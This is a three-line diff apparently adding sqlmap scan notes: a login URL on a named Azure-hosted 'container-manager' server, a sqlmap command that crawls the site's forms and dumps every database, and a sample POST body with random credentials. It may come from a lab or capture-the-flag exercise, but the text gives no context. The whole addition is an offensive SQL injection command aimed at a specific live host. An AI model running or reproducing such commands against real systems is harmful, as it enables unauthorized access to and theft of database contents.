@@ -1,0 +1,3 @@
+http://container-manager.francecentral.cloudapp.azure.com:10156/login.php (POST)  # sqlmap.py -u http://container-manager.francecentral.cloudapp.azure.com:10156/confirm.php --batch --forms --crawl=2 --dump-all -v
+
+username=qzTt&password=vAfS
